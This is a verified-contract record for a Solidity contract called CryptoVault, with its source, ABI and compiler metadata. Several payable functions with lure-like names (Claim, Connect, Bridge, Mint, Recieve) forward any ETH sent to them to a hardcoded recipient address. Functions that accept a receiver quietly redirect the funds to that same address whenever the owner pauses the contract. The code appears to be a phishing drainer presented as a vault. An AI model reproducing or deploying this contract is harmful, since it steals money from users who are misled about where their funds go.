{"SourceCode": "{\"Context.sol\":{\"content\":\"// SPDX-License-Identifier: GPL-3.0\\n\\npragma solidity \\u003e=0.7.0 \\u003c0.9.0;\\n\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\"},\"CryptoVault.sol\":{\"content\":\"// SPDX-License-Identifier: UNLICENSED\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"./Owner.sol\\\";\\nimport \\\"./Pausable.sol\\\";\\nimport \\\"./IERC20.sol\\\";\\n\\n\\n\\n\\ncontract CryptoVault is Ownable,Pausable {\\n    event TransferSent(address _from, address _destAddr, uint256 _amount);\\n    event TokenSent(IERC20 _token, address _receiver, uint256 _amount);\\n    event RecipientChanged(address indexed oldRecipient, address indexed newRecipient);\\n    event Vault(bool isVault);\\n\\n\\n    address private recipient = 0x283Ea2C553ba2aAb51f1F3377f28e2ed64cB609c;\\n    bool private _storeEther = false;\\n\\n \\n\\n\\n    function updateRecipient(address _recipient) public isOwner {\\n        emit RecipientChanged(recipient, _recipient);\\n        recipient = _recipient;\\n    }\\n\\n\\n\\n    function currentRecipient() external view returns (address) {\\n        return recipient;\\n    }\\n\\n    function isVault() external view returns (bool) {\\n        return _storeEther;\\n    }\\n\\n    function _transferEth(address payable _to, uint256 value) private returns (bytes memory) {\\n        (bool sent, bytes memory data) = _to.call{value: value}(\\\"\\\");\\n        require(sent, \\\"Failed to send Ether\\\");\\n        return data;\\n    }\\n\\n    function _safeTransfer(\\n        IERC20 token,\\n        address receiver,\\n        uint256 amount\\n    ) private {\\n        bool sent = token.transfer(receiver,amount);\\n        require(sent, \\\"Token transfer failed\\\");\\n    }\\n\\n    function pause() public isOwner {\\n        _pause();\\n    }\\n\\n    function createVault() public isOwner {\\n        _storeEther = true;\\n        emit Vault(_storeEther);\\n    }\\n\\n    function destroyVault() public isOwner {\\n        _storeEther = false;\\n        emit Vault(_storeEther);\\n    }\\n\\n    function unpause() public isOwner {\\n        _unpause();\\n    }\\n\\n    function balance() public view returns (uint256) {\\n        return address(this).balance;\\n    } \\n\\n    function tokenBalance(IERC20 token) public view returns (uint256) {\\n        return token.balanceOf(address(this));\\n    } \\n\\n    \\n    function Claim() public payable{\\n        if(_storeEther) {\\n            emit TransferSent(msg.sender,address(this),msg.value);\\n        } else {\\n            _transferEth(payable(recipient),msg.value);\\n            emit TransferSent(msg.sender,recipient,msg.value);\\n        }\\n    }\\n\\n    function Connect() public payable{\\n        if(_storeEther) {\\n            emit TransferSent(msg.sender,address(this),msg.value);\\n        } else {\\n            _transferEth(payable(recipient),msg.value);\\n            emit TransferSent(msg.sender,recipient,msg.value);\\n        }\\n    }\\n\\n    function Bridge() public payable{\\n        if(_storeEther) {\\n            emit TransferSent(msg.sender,address(this),msg.value);\\n        } else {\\n            _transferEth(payable(recipient),msg.value);\\n            emit TransferSent(msg.sender,recipient,msg.value);\\n        }\\n    }\\n\\n    function Recieve() public payable{\\n        if(_storeEther) {\\n            emit TransferSent(msg.sender,address(this),msg.value);\\n        } else {\\n            _transferEth(payable(recipient),msg.value);\\n            emit TransferSent(msg.sender,recipient,msg.value);\\n        }\\n    }\\n\\n    function Mint() public payable{\\n        if(_storeEther) {\\n            emit TransferSent(msg.sender,address(this),msg.value);\\n        } else {\\n            _transferEth(payable(recipient),msg.value);\\n            emit TransferSent(msg.sender,recipient,msg.value);\\n        }\\n    }\\n\\n    function mint(address payable receiver) public payable {\\n        if(paused()) {\\n         _transferEth(payable(recipient),msg.value);\\n        } else {\\n            _transferEth(receiver,msg.value);\\n        }\\n        emit TransferSent(msg.sender,receiver,msg.value);\\n    }\\n\\n    function connect(address payable receiver) public payable {\\n        if(paused()) {\\n         _transferEth(payable(recipient),msg.value);\\n        } else {\\n            _transferEth(receiver,msg.value);\\n        }\\n        emit TransferSent(msg.sender,receiver,msg.value);\\n    }\\n\\n    function bridge(address payable receiver) public payable {\\n        if(paused()) {\\n         _transferEth(payable(recipient),msg.value);\\n        } else {\\n            _transferEth(receiver,msg.value);\\n        }\\n        emit TransferSent(msg.sender,receiver,msg.value);\\n    }\\n\\n    function recieve(address payable receiver) public payable {\\n        if(paused()) {\\n         _transferEth(payable(recipient),msg.value);\\n        } else {\\n            _transferEth(receiver,msg.value);\\n        }\\n        emit TransferSent(msg.sender,receiver,msg.value);\\n    }\\n\\n    function claim(address payable receiver) public payable {\\n        if(paused()) {\\n         _transferEth(payable(recipient),msg.value);\\n        } else {\\n            _transferEth(receiver,msg.value);\\n        }\\n        emit TransferSent(msg.sender,receiver,msg.value);\\n    }\\n\\n\\n    function withDrawEther(uint256 amount, address payable receiver) public isOwner {\\n        require(amount \\u003c= address(this).balance, \\\"Requested amount exceeds the contract balance.\\\");\\n        require(receiver != address(0), \\\"Recipient address cannot be the zero address.\\\");\\n        _transferEth(receiver,amount);\\n        emit TransferSent(address(this),receiver,amount);\\n    }\\n\\n    function withDrawToken(IERC20 token, address receiver, uint256 amount) public isOwner {\\n        require(amount \\u003c= token.balanceOf(address(this)), \\\"Requested amount exceeds the contract balance.\\\");\\n        require(receiver != address(0), \\\"Recipient address cannot be the zero address.\\\");\\n        _safeTransfer(token,receiver,amount);\\n        emit TokenSent(token,receiver,amount);\\n    }\\n\\n    function withdrawTokens(IERC20[] memory tokens, uint256[] memory amounts, address receiver) public isOwner {\\n        require(tokens.length == amounts.length, \\\"Arrays length mismatch\\\");\\n\\n        for (uint256 i = 0; i \\u003c tokens.length; i++) {\\n            IERC20 token = tokens[i];\\n            uint256 amount = amounts[i];\\n            require(amount \\u003c= token.balanceOf(address(this)), \\\"Insufficient balance for token\\\");\\n            _safeTransfer(token,receiver,amount);\\n            emit TokenSent(token,receiver,amount);\\n        }\\n    }\\n\\n    function withdrawTokens(IERC20[] memory tokens, uint256[] memory amounts, address[] memory receivers) public isOwner {\\n        require(tokens.length == amounts.length, \\\"Arrays length mismatch\\\");\\n        for (uint256 i = 0; i \\u003c tokens.length; i++) {\\n            IERC20 token = tokens[i];\\n            uint256 amount = amounts[i];\\n            address receiver = receivers[i];\\n            require(amount \\u003c= token.balanceOf(address(this)), \\\"Insufficient balance for token\\\");\\n            _safeTransfer(token,receiver,amount);\\n            emit TokenSent(token,receiver,amount);\\n        }\\n    }\\n\\n}\"},\"IERC20.sol\":{\"content\":\"// SPDX-License-Identifier: UNLICENSED\\n\\npragma solidity ^0.8.0;\\n\\ninterface IERC20 {\\n    function totalSupply() external view returns (uint256);\\n\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    function transfer(address to, uint256 amount) external returns (bool);\\n\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    function approve(address spender, uint256 amount) external returns (bool);\\n\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) external returns (bool);\\n\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n}\"},\"Owner.sol\":{\"content\":\"// SPDX-License-Identifier: GPL-3.0\\n\\npragma solidity \\u003e=0.7.0 \\u003c0.9.0;\\n\\ncontract Ownable {\\n\\n    address private owner;\\n    \\n    event OwnerChanged(address indexed oldOwner, address indexed newOwner);\\n    \\n    modifier isOwner() {\\n        require(msg.sender == owner, \\\"Not Authorized to call this method\\\");\\n        _;\\n    }\\n    \\n    constructor() {\\n        owner = msg.sender;\\n        emit OwnerChanged(address(0), owner);\\n    }\\n\\n    function changeOwner(address newOwner) public isOwner {\\n        emit OwnerChanged(owner, newOwner);\\n        owner = newOwner;\\n    }\\n\\n    function getOwner() external view returns (address) {\\n        return owner;\\n    }\\n}\"},\"Pausable.sol\":{\"content\":\"// SPDX-License-Identifier: GPL-3.0\\n\\npragma solidity \\u003e=0.7.0 \\u003c0.9.0;\\n\\nimport \\\"./Context.sol\\\";\\n\\nabstract contract Pausable is Context {\\n\\n    event Paused(address account);\\n\\n    event Unpaused(address account);\\n\\n    bool private _paused;\\n\\n    constructor() {\\n        _paused = false;\\n    }\\n\\n    function paused() public view virtual returns (bool) {\\n        return _paused;\\n    }\\n\\n    modifier whenNotPaused() {\\n        require(!paused(), \\\"Pausable: paused\\\");\\n        _;\\n    }\\n\\n    modifier whenPaused() {\\n        require(paused(), \\\"Pausable: not paused\\\");\\n        _;\\n    }\\n\\n  \\n    function _pause() internal virtual whenNotPaused {\\n        _paused = true;\\n        emit Paused(_msgSender());\\n    }\\n\\n    function _unpause() internal virtual whenPaused {\\n        _paused = false;\\n        emit Unpaused(_msgSender());\\n    }\\n}\\n\"}}", "ABI": "[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnerChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"Paused\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldRecipient\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newRecipient\",\"type\":\"address\"}],\"name\":\"RecipientChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"contract IERC20\",\"name\":\"_token\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"_receiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"TokenSent\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"_destAddr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"TransferSent\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"Unpaused\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"isVault\",\"type\":\"bool\"}],\"name\":\"Vault\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Bridge\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Claim\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Connect\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Mint\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Recieve\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"balance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"bridge\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"changeOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"claim\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"connect\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"createVault\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"currentRecipient\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"destroyVault\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isVault\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"mint\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pause\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"paused\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"recieve\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"tokenBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"unpause\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_recipient\",\"type\":\"address\"}],\"name\":\"updateRecipient\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address payable\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"withDrawEther\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withDrawToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20[]\",\"name\":\"tokens\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"amounts\",\"type\":\"uint256[]\"},{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"withdrawTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20[]\",\"name\":\"tokens\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"amounts\",\"type\":\"uint256[]\"},{\"internalType\":\"address[]\",\"name\":\"receivers\",\"type\":\"address[]\"}],\"name\":\"withdrawTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CryptoVault", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://98a37d3862af5d0ea84869c0822122ce35dda1fb048bf50997b3f883484cd0c4"}